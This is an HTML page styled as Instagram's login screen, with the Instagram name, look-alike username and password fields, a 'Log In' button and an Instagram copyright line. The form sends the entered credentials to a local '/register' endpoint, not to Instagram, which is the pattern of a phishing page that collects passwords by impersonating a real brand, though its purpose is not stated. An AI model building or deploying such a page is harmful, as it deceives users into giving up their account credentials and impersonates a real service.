<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      width: 350px;
      padding: 40px;
      background: white;
      border: 1px solid #dbdbdb;
      text-align: center;
    }

    .login-box h1 {
      font-family: 'Billabong', cursive;
      font-size: 48px;
      margin-bottom: 20px;
    }

    .login-box input {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
    }

    .login-box button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background-color: #3897f0;
      color: white;
      border: none;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
    }

    .login-box p {
      font-size: 12px;
      color: #999;
      margin-top: 20px;
    }

    
  </style>
</head>
<body>
  
  <div class="login-box">
    <h1>Instagram</h1>
    <img src="logo.png" alt="">
    <form action="/register" method="POST">
      <input type="text" name="username" placeholder="Phone number, username, or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <p>Â© 2025 Instagram </p>

  </div>

  <img src="logo.png" alt="">
</body>
</html>
